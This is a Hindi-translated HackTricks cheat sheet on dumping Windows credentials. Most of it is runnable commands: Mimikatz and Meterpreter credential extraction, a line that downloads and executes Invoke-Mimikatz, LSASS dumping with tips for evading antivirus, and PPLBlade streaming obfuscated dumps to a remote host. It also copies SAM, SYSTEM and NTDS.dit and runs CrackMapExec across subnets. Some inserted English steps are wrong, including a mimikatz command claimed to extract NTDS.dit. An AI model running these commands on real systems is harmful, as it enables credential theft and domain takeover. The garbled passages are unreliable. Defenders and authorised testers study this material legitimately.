# Windows क्रेडेंशियल्स चोरी

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करना चाहिए? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एकल [**NFT**](https://opensea.io/collection/the-peass-family) संग्रह
* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में **शामिल हों** या मुझे **Twitter** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स को** [**hacktricks रेपो**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud रेपो**](https://github.com/carlospolop/hacktricks-cloud) **में PR जमा करके साझा करें।**

</details>

## क्रेडेंशियल्स Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**इस पेज में** [**देखें**](credentials-mimikatz.md)** कि Mimikatz और क्या कर सकता है।**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**यहां कुछ संभावित प्रमाणीकरण सुरक्षा के बारे में जानें।**](credentials-protections.md) **यह सुरक्षा Mimikatz को कुछ प्रमाणीकरण निकालने से रोक सकती है।**

## Meterpreter के साथ प्रमाणपत्र

[**मैंने बनाया है**](https://github.com/carlospolop/MSF-Credentials) **[**प्रमाणपत्र प्लगइन**](https://github.com/carlospolop/MSF-Credentials) **का उपयोग करें और शिकार में से पासवर्ड और हैश खोजें।**
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AV को छलना

### Procdump + Mimikatz

**SysInternals** के **Procdump** से, जो कि एक वैध Microsoft उपकरण है, इसे Defender नहीं पकड़ता है।\
आप इस उपकरण का उपयोग करके **lsass प्रक्रिया को डंप कर सकते हैं**, **डंप डाउनलोड कर सकते हैं** और **डंप से स्थानीय रूप से प्रमाणित कर सकते हैं**।

{% code title="lsass को डंप करें" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% code title="डंप से क्रेडेंशियल्स निकालें" %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

यह प्रक्रिया स्वचालित रूप से [SprayKatz](https://github.com/aas-n/spraykatz) के साथ की जाती है: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**नोट**: कुछ **AV** इस्तेमाल को **खतरनाक** मान सकते हैं, **procdump.exe को lsass.exe को डंप करने** के लिए, यह इसलिए है क्योंकि वे **"procdump.exe" और "lsass.exe"** स्ट्रिंग को **पहचान रहे हैं**। इसलिए, यह **छिपकर** करने के लिए यह **बेहतर** है कि आप **lsass.exe का PID** procdump को **नाम lsass.exe की बजाय एक तर्क** के रूप में **पास** करें।

### **comsvcs.dll** के साथ lsass को डंप करना

`C:\Windows\System32` में स्थित एक DLL है जिसका नाम **comsvcs.dll** है, जो **प्रक्रिया की मेमोरी को डंप** करता है जब वे **क्रैश** होते हैं। इस DLL में एक ऐसा **फंक्शन** होता है जिसका नाम **`MiniDumpW`** है और इसे `rundll32.exe` के साथ कॉल किया जा सकता है।\
पहले दो तर्क का उपयोग नहीं होता है, लेकिन तीसरा तर्क 3 भागों में विभाजित होता है। पहला भाग वह प्रक्रिया ID है जिसे डंप किया जाएगा, दूसरा भाग डंप फ़ाइल स्थान है, और तीसरा भाग शब्द **पूरा** है। कोई अन्य विकल्प नहीं है।\
इन 3 तर्कों को पार्स करने के बाद, मूल रूप से यह DLL डंप फ़ाइल बनाता है, और उस डंप फ़ाइल में निर्दिष्ट प्रक्रिया को डंप करता है।\
इस फ़ंक्शन की मदद से, हम **comsvcs.dll** का उपयोग procdump को अपलोड करके और इसे निष्पादित करके lsass प्रक्रिया को डंप करने के बजाय कर सकते हैं। (यह जानकारी [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/) से निकाली गई है)
```
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
हमें यह ध्यान में रखना होगा कि यह तकनीक केवल **सिस्टम** के रूप में कार्यान्वित की जा सकती है।

आप इस प्रक्रिया को [lssasy](https://github.com/Hackndo/lsassy) के साथ स्वचालित कर सकते हैं।

### Task Manager के साथ lsass को डंप करना

1. टास्क बार पर दायां क्लिक करें और टास्क मैनेजर पर क्लिक करें
2. अधिक विवरण पर क्लिक करें
3. प्रक्रियाओं टैब में "स्थानीय सुरक्षा प्राधिकरण प्रक्रिया" प्रक्रिया की खोज करें
4. "स्थानीय सुरक्षा प्राधिकरण प्रक्रिया" प्रक्रिया पर दायां क्लिक करें और "डंप फ़ाइल बनाएँ" पर क्लिक करें।

### procdump के साथ lsass को डंप करना

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) माइक्रोसॉफ्ट साइन किया गया बाइनरी है जो [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) स्यूट का हिस्सा है।
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## PPLBlade के साथ lsass को डंप करना

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) एक सुरक्षित प्रक्रिया डंपर टूल है जो मेमोरी डंप को अस्पष्ट करने और इसे डिस्क पर छोड़े बिना रिमोट वर्कस्टेशन पर ट्रांसफर करने का समर्थन करता है।

**मुख्य कार्यक्षमताएं**:

1. PPL सुरक्षा को छोड़ना
2. डिफेंडर सिग्नेचर-आधारित पहचानन मेकेनिज़्मों को टालने के लिए मेमोरी डंप फ़ाइलों को अस्पष्ट करना
3. डिस्क पर छोड़े बिना मेमोरी डंप को RAW और SMB अपलोड विधियों के साथ अपलोड करना (फ़ाइललेस डंप)

{% code overflow="wrap" %}
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
{% endcode %}

## CrackMapExec

### SAM हैश निकालें
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### LSA सीक्रेट्स को डंप करें

एलएसए सीक्रेट्स को डंप करने के लिए निम्नलिखित कमांड का उपयोग करें:

```plaintext
lsadump::secrets
```

यह कमांड एलएसए सीक्रेट्स को डंप करने के लिए Mimikatz टूल का उपयोग करता है। डंप किए गए सीक्रेट्स में पासवर्ड, टोकन और अन्य प्रमाणिका जानकारी शामिल हो सकती है।
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### टारगेट DC से NTDS.dit डंप करें

To dump the NTDS.dit file from a target Domain Controller (DC), you can use various methods such as using the `ntdsutil` tool or using a tool like `mimikatz`. The NTDS.dit file contains the Active Directory (AD) database, including user account credentials.

#### Using ntdsutil:

1. Open a command prompt with administrative privileges on a machine that is part of the domain.
2. Run the following command to open the ntdsutil tool:
   ```
   ntdsutil
   ```
3. Inside the ntdsutil prompt, run the following commands:
   ```
   activate instance ntds
   ifm
   create full C:\path\to\output\folder
   quit
   quit
   ```
   Replace `C:\path\to\output\folder` with the desired path where you want to save the NTDS.dit file.

#### Using mimikatz:

1. Download and compile the mimikatz tool on your machine.
2. Open a command prompt with administrative privileges.
3. Navigate to the folder where mimikatz is located.
4. Run the following command to start mimikatz:
   ```
   mimikatz.exe
   ```
5. Inside the mimikatz prompt, run the following commands:
   ```
   privilege::debug
   lsadump::lsa /inject /name:ntds
   ```
   This will inject the mimikatz module into the LSASS process to extract the NTDS.dit file.
6. The NTDS.dit file will be dumped in the same folder where mimikatz is located.

Note: Dumping the NTDS.dit file requires administrative privileges and should only be performed on authorized systems for legitimate purposes, such as penetration testing or forensic analysis.
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### टारगेट DC से NTDS.dit पासवर्ड इतिहास डंप करें

To dump the NTDS.dit password history from a target DC, follow these steps:

1. First, gain administrative access to the target DC.
2. Open a command prompt with administrative privileges.
3. Use the `ntdsutil` command to enter the NTDS.dit management mode:
   ```
   ntdsutil
   ```
4. Switch to the "activate instance ntds" mode:
   ```
   activate instance ntds
   ```
5. Enter the "passwords" mode:
   ```
   ifm
   ```
6. Set the desired directory to store the dumped files:
   ```
   create full <directory>
   ```
   Replace `<directory>` with the path to the directory where you want to store the dumped files.
7. Exit the "ifm" mode:
   ```
   quit
   ```
8. Exit the NTDS.dit management mode:
   ```
   quit
   ```
9. Navigate to the directory specified in step 6 to access the dumped NTDS.dit password history files.

By following these steps, you will be able to dump the NTDS.dit password history from the target DC.
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### हर NTDS.dit खाते के लिए pwdLastSet विशेषता दिखाएं

To show the pwdLastSet attribute for each NTDS.dit account, follow these steps:

1. Open a command prompt with administrative privileges.
2. Run the following command to access the NTDS.dit database:

   ```
   ntdsutil
   ```

3. Switch to the Active Directory database:

   ```
   activate instance ntds
   ```

4. List all the accounts in the NTDS.dit database:

   ```
   ifm
   create full c:\temp
   ```

5. Navigate to the `c:\temp` directory:

   ```
   cd c:\temp
   ```

6. Open the `ntds.dit` file using a tool like `dsusers.py` or `dsusers2.py`:

   ```
   dsusers.py ntds.dit
   ```

   or

   ```
   dsusers2.py ntds.dit
   ```

   This will display the pwdLastSet attribute for each account in the NTDS.dit database.

By following these steps, you can easily view the pwdLastSet attribute for each NTDS.dit account.
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## साम और सिस्टम चोरी करना

ये फ़ाइलें _C:\windows\system32\config\SAM_ और _C:\windows\system32\config\SYSTEM_ में स्थित होनी चाहिए। लेकिन आप उन्हें साधारित तरीके से कॉपी नहीं कर सकते क्योंकि वे सुरक्षित हैं।

### रजिस्ट्री से

इन फ़ाइलों को चुराने का सबसे आसान तरीका रजिस्ट्री से एक कॉपी प्राप्त करना है:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**वह फ़ाइलें** अपनी Kali मशीन पर डाउनलोड करें और **हैश निकालें** इसका उपयोग करके:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### वॉल्यूम शैडो कॉपी

आप इस सेवा का उपयोग करके सुरक्षित फ़ाइलों की प्रतिलिपि बना सकते हैं। आपको व्यवस्थापक होना चाहिए।

#### vssadmin का उपयोग करें

vssadmin बाइनरी केवल Windows सर्वर संस्करणों में ही उपलब्ध है।
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
लेकिन आप इसे **पॉवरशेल** से भी कर सकते हैं। यहां एक उदाहरण है **कि कैसे SAM फ़ाइल की प्रतिलिपि बनाई जाए** (इस्तेमाल किए गए हार्ड ड्राइव "C:" है और इसे C:\users\Public में सहेजा जाता है) लेकिन आप इसका उपयोग किसी भी सुरक्षित फ़ाइल की प्रतिलिपि बनाने के लिए कर सकते हैं:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
किताब से कोड: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

अंत में, आप [**PS स्क्रिप्ट Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) का उपयोग करके SAM, SYSTEM और ntds.dit की एक प्रतिलिपि बना सकते हैं।
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory क्रेडेंशियल्स - NTDS.dit**

**Ntds.dit फ़ाइल एक डेटाबेस है जो Active Directory डेटा को संग्रहीत करती है**, जिसमें उपयोगकर्ता ऑब्जेक्ट, समूह और समूह सदस्यता के बारे में जानकारी शामिल होती है। यह डोमेन में सभी उपयोगकर्ताओं के पासवर्ड हैश भी शामिल करता है।

महत्वपूर्ण NTDS.dit फ़ाइल **इस पते पर स्थित होगी**: _%SystemRoom%/NTDS/ntds.dit_\
यह फ़ाइल एक डेटाबेस _Extensible Storage Engine_ (ESE) है और "आधिकारिक रूप से" 3 तालिकाओं से मिलकर बनी है:

* **डेटा तालिका**: ऑब्जेक्ट (उपयोगकर्ता, समूह...) के बारे में जानकारी शामिल होती है।
* **लिंक तालिका**: संबंधों (के सदस्य...) के बारे में जानकारी शामिल होती है।
* **SD तालिका**: प्रत्येक ऑब्जेक्ट के सुरक्षा विवरण शामिल होते हैं।

इसके बारे में अधिक जानकारी: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows _Ntdsa.dll_ का उपयोग उस फ़ाइल के साथ संवाद करने के लिए करता है और इसे _lsass.exe_ द्वारा उपयोग किया जाता है। फिर, **NTDS.dit** फ़ाइल का **हिस्सा** **`lsass`** की **मेमोरी के अंदर स्थित हो सकता है** (आप एक **कैश** का उपयोग करके संभावित रूप से हाल ही में एक्सेस की गई डेटा को खोज सकते हैं, क्योंकि इससे प्रदर्शन में सुधार होता है)।

#### NTDS.dit में हैश डिक्रिप्ट करना

हैश को 3 बार एनक्रिप्ट किया जाता है:

1. **BOOTKEY** और **RC4** का उपयोग करके **पासवर्ड एन्क्रिप्शन कुंजी (PEK)** को डिक्रिप्ट करें।
2. **PEK** और **RC4** का उपयोग करके **हैश** को डिक्रिप्ट करें।
3. **DES** का उपयोग करके **हैश** को डिक्रिप्ट करें।

**PEK** में **हर डोमेन कंट्रोलर में समान मान** होता है, लेकिन यह **NTDS.dit** फ़ाइल में **बूटकी** का उपयोग करके **डोमेन कंट्रोलर के सिस्टम फ़ाइल (डोमेन कंट्रोलर के बीच अलग होता है)** में एन्क्रिप्ट किया जाता है। इसलिए NTDS.dit फ़ाइल से क्रेडेंशियल प्राप्त करने के लिए **आपको NTDS.dit और SYSTEM फ़ाइल** (_C:\Windows\System32\config\SYSTEM_) की आवश्यकता होती है।

### Ntdsutil का उपयोग करके NTDS.dit की कॉपी करना

Windows Server 2008 से उपलब्ध है।
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
आप वॉल्यूम शैडो कॉपी ट्रिक का उपयोग करके भी **ntds.dit** फ़ाइल की कॉपी बना सकते हैं। ध्यान दें कि आपको इसके साथ ही **SYSTEM फ़ाइल** की भी एक कॉपी की आवश्यकता होगी (फिर से रजिस्ट्री से डंप करें या वॉल्यूम शैडो कॉपी ट्रिक का उपयोग करें).

### **NTDS.dit से हैश निकालना**

जब आपने **NTDS.dit** और **SYSTEM** फ़ाइलें **प्राप्त** कर ली हों, तो आप _secretsdump.py_ जैसे टूल का उपयोग करके **हैश निकाल सकते हैं**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
आप एक मान्य डोमेन व्यवस्थापक उपयोगकर्ता का उपयोग करके उन्हें स्वचालित रूप से **निकाल सकते हैं**:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
बड़े NTDS.dit फ़ाइलों के लिए, इसे [gosecretsdump](https://github.com/c-sto/gosecretsdump) का उपयोग करके निकालना सिफारिश किया जाता है।

अंत में, आप **metasploit मॉड्यूल** का भी उपयोग कर सकते हैं: _post/windows/gather/credentials/domain\_hashdump_ या **mimikatz** `lsadump::lsa /inject`

### **NTDS.dit से डोमेन ऑब्जेक्ट्स को SQLite डेटाबेस में निकालना**

NTDS ऑब्जेक्ट्स को [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) के साथ एक SQLite डेटाबेस में निकाला जा सकता है। यहां तक कि जब रॉ एनटीडीएस.dit फ़ाइल प्राप्त कर ली जाती है, तो रहस्य निकाले जाते हैं ही नहीं, बल्कि पूरे ऑब्जेक्ट्स और उनके गुण भी निकाले जाते हैं जो आगे की जानकारी निकालने के लिए होते हैं।
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` हाइव वैकल्पिक है लेकिन इसके द्वारा सीक्रेट्स की डिक्रिप्शन की जा सकती है (एनटी और एलएम हैश, सप्लीमेंटल क्रेडेंशियल जैसे क्लियरटेक्स्ट पासवर्ड, केरबेरोस या ट्रस्ट की, एनटी और एलएम पासवर्ड हिस्ट्री)। इसके साथ ही, निम्नलिखित डेटा निकाला जाता है: उपयोगकर्ता और मशीन खाते उनके हैश के साथ, UAC फ्लैग, अंतिम लॉगऑन और पासवर्ड बदलने का समय, खातों का विवरण, नाम, UPN, SPN, समूह और पुनरावृत्ति सदस्यता, संगठनात्मक इकाइयों का पेड़ और सदस्यता, विश्वसनीय डोमेन जो ट्रस्ट के प्रकार, दिशा और गुण हैं...

## Lazagne

यहां से बाइनरी डाउनलोड करें [यहां](https://github.com/AlessandroZ/LaZagne/releases). आप इस बाइनरी का उपयोग करके कई सॉफ़्टवेयर से क्रेडेंशियल निकाल सकते हैं।
```
lazagne.exe all
```
## SAM और LSASS से क्रेडेंशियल्स निकालने के लिए अन्य उपकरण

### Windows credentials Editor (WCE)

इस उपकरण का उपयोग मेमोरी से क्रेडेंशियल्स निकालने के लिए किया जा सकता है। इसे यहां से डाउनलोड करें: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM फ़ाइल से क्रेडेंशियल्स निकालें
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAM फ़ाइल से क्रेडेंशियल्स निकालें
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

इसे यहाँ से डाउनलोड करें: [http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) और इसे **चलाएं** और पासवर्ड निकाल लिए जाएंगे।

## रक्षाओं

[**कुछ क्रेडेंशियल सुरक्षा के बारे में यहाँ सीखें।**](credentials-protections.md)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की आवश्यकता है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह।
* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें और PRs सबमिट करके** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को**।

</details>
